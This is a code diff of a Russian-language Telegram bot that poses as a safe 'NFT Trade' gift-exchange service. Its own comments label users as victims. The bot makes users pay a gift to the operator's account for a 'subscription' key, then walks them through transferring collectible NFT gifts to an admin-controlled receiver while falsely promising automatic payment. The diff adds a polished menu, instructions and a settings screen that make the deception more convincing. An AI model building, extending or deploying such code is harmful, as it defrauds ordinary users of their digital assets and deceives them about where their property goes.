@@ -21,19 +21,18 @@ log = logging.getLogger("offerbot")
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
-RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
+DEFAULT_RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-# Память
 OFFERS = {}
 USERS = {}  # user_id: {"subscribed": bool, "receiver": str}
 KEYS = set()
 
-# Генерируем 100 ключей при старте
+# Генерируем 100 ключей
 for _ in range(100):
     key = "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
     KEYS.add(key)
@@ -60,7 +59,29 @@ def parse_price(text: str):
     return (amount, "Stars")
 
 # ==========================================
-# АДМИН ПАНЕЛЬ
+# ФУНКЦИЯ ГЛАВНОГО МЕНЮ
+# ==========================================
+async def show_main_menu(message: Message, edit=False):
+    text = (
+        "🤖 <b>Добро пожаловать в NFT Trade!</b>\n\n"
+        "Этот бот помогает безопасно обменивать и передавать коллекционные подарки.\n\n"
+        "<b>Как это работает:</b>\n"
+        "1. Вы получаете оффер от другого пользователя.\n"
+        "2. Нажимаете «Принять».\n"
+        "3. Следуете инструкции для передачи NFT.\n\n"
+        "👇 Выберите действие:"
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="📖 Инструкция", callback_data="show_help")],
+        [InlineKeyboardButton(text="⚙️ Настройки", callback_data="show_settings")]
+    ])
+    if edit:
+        await message.edit_text(text, reply_markup=kb)
+    else:
+        await message.answer(text, reply_markup=kb)
+
+# ==========================================
+# КОМАНДЫ И СТАРТ
 # ==========================================
 @router.message(Command("start"))
 async def cmd_start(msg: Message):
@@ -68,35 +89,94 @@ async def cmd_start(msg: Message):
         await msg.reply(
             "👑 <b>Админ-панель:</b>\n\n"
             "/keys — список ключей\n"
-            "/set_receiver @ник — сменить получателя\n"
+            "/set_receiver @ник — сменить глобального получателя\n"
             "/купить [ссылка] [цена] @юзер — создать оффер"
         )
         return
     
-    # Логика для жертв
     uid = msg.from_user.id
     if uid not in USERS:
-        USERS[uid] = {"subscribed": False, "receiver": RECEIVER}
+        USERS[uid] = {"subscribed": False, "receiver": DEFAULT_RECEIVER}
     
     if USERS[uid]["subscribed"]:
-        await msg.reply("✅ У вас есть активная подписка. Можете пользоваться сервисом.")
+        await show_main_menu(msg)
         return
 
+    # Если подписки нет
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Оплатить (50 ⭐️)", url=f"https://t.me/{RECEIVER}")],
+        [InlineKeyboardButton(text="Оплатить (50 ⭐️)", url=f"https://t.me/{DEFAULT_RECEIVER}")],
         [InlineKeyboardButton(text="Ввести ключ", callback_data="enter_key")]
     ])
     await msg.reply(
-        "👋 <b>Добро пожаловать!</b>\n\n"
-        "Для доступа к сервису необходима подписка.\n\n"
-        "<b>Условия:</b>\n"
-        f"1. Перейдите к <b>@{RECEIVER}</b> (нажмите кнопку ниже)\n"
-        f"2. Отправьте один подарок за <b>50 ⭐️</b>\n"
-        f"3. После отправки нажмите «Ввести ключ» и введите ключ, который вам выдаст администратор.\n\n"
+        "👋 <b>Для доступа к сервису нужна подписка.</b>\n\n"
+        f"1. Перейдите к <b>@{DEFAULT_RECEIVER}</b> (кнопка ниже)\n"
+        f"2. Отправьте подарок за <b>50 ⭐️</b>\n"
+        f"3. Нажмите «Ввести ключ» и введите полученный код.\n\n"
         "Подписка активируется навсегда.",
         reply_markup=kb
     )
 
+# ==========================================
+# ОБРАБОТЧИКИ КНОПОК МЕНЮ
+# ==========================================
+@router.callback_query(F.data == "show_help")
+async def show_help(cb: CallbackQuery):
+    text = (
+        "<b>📖 Инструкция</b>\n\n"
+        "1. Когда вам предложат оффер, вы получите сообщение с кнопками.\n"
+        "2. Нажмите «Принять», затем «Передать NFT».\n"
+        "3. В открывшемся меню укажите получателя и подтвердите передачу.\n\n"
+        "После этого деньги (или звёзды) автоматически зачислятся на ваш счёт."
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+    ])
+    await cb.message.edit_text(text, reply_markup=kb)
+    await cb.answer()
+
+@router.callback_query(F.data == "show_settings")
+async def show_settings(cb: CallbackQuery):
+    uid = cb.from_user.id
+    current_rec = USERS.get(uid, {}).get("receiver", DEFAULT_RECEIVER)
+    text = (
+        "<b>⚙️ Настройки</b>\n\n"
+        f"Ваш текущий получатель для офферов: <b>@{current_rec}</b>\n\n"
+        "Чтобы изменить получателя (на кого передавать подарки), отправьте команду:\n"
+        "<code>/setuse @ваш_ник</code>"
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
+    ])
+    await cb.message.edit_text(text, reply_markup=kb)
+    await cb.answer()
+
+@router.callback_query(F.data == "main_menu")
+async def back_to_menu(cb: CallbackQuery):
+    await show_main_menu(cb.message, edit=True)
+    await cb.answer()
+
+# ==========================================
+# КОМАНДЫ ДЛЯ ЖЕРТВЫ
+# ==========================================
+@router.message(Command("setuse"))
+async def cmd_set_use(msg: Message):
+    uid = msg.from_user.id
+    if not USERS.get(uid, {}).get("subscribed"):
+        await msg.reply("❌ Сначала активируйте подписку через /start.")
+        return
+    
+    parts = msg.text.split()
+    if len(parts) < 2 or not parts[1].startswith("@"):
+        await msg.reply("❌ Формат: <code>/setuse @ваш_ник</code>")
+        return
+    
+    new_rec = parts[1].replace("@", "").strip()
+    USERS[uid]["receiver"] = new_rec
+    await msg.reply(f"✅ Получатель для ваших офферов изменен на <b>@{new_rec}</b>.")
+
+# ==========================================
+# АДМИН ПАНЕЛЬ
+# ==========================================
 @router.message(Command("keys"))
 async def cmd_keys(msg: Message):
     if msg.from_user.id != ADMIN_ID: return
@@ -104,17 +184,15 @@ async def cmd_keys(msg: Message):
     await msg.reply(f"<b>Осталось ключей ({len(KEYS)}):</b>\n<code>{keys_list}</code>\n... и еще {max(0, len(KEYS)-20)}")
 
 @router.message(F.text.regexp(r"^/set_receiver\s+"))
-async def cmd_set_receiver(msg: Message):
+async def cmd_set_global_receiver(msg: Message):
     if msg.from_user.id != ADMIN_ID: return
-    global RECEIVER
+    global DEFAULT_RECEIVER
     new_rec = msg.text.replace("/set_receiver", "").strip().replace("@", "")
-    RECEIVER = new_rec
-    for uid in USERS:
-        USERS[uid]["receiver"] = new_rec
-    await msg.reply(f"✅ Получатель изменен на @{new_rec}")
+    DEFAULT_RECEIVER = new_rec
+    await msg.reply(f"✅ Глобальный получатель по умолчанию изменен на @{new_rec}")
 
 # ==========================================
-# ВВОД КЛЮЧА
+# АКТИВАЦИЯ КЛЮЧА
 # ==========================================
 @router.callback_query(F.data == "enter_key")
 async def on_enter_key(cb: CallbackQuery):
@@ -126,11 +204,14 @@ async def check_key(msg: Message):
     uid = msg.from_user.id
     key = msg.text.strip().upper()
     if key in KEYS:
-        KEYS.remove(key) # Ключ сгорает
+        KEYS.remove(key)
         if uid not in USERS: USERS[uid] = {}
         USERS[uid]["subscribed"] = True
-        USERS[uid]["receiver"] = RECEIVER
+        USERS[uid]["receiver"] = DEFAULT_RECEIVER
+        
+        # СРАЗУ ПОКАЗЫВАЕМ ГЛАВНОЕ МЕНЮ
         await msg.reply("✅ Ключ активирован! Подписка навсегда ваша.")
+        await show_main_menu(msg)
     else:
         await msg.reply("❌ Неверный или уже использованный ключ.")
 
@@ -229,7 +310,7 @@ async def on_accept2(cb: CallbackQuery):
     oid = cb.data.split(":", 1)[1]
     offer = OFFERS.get(oid)
     native_url = f"tg://send_gift?slug={offer['nft_slug']}"
-    receiver = USERS.get(cb.from_user.id, {}).get("receiver", RECEIVER)
+    receiver = USERS.get(cb.from_user.id, {}).get("receiver", DEFAULT_RECEIVER)
     
     text = (
         f"<b>Инструкция по передаче:</b>\n\n"
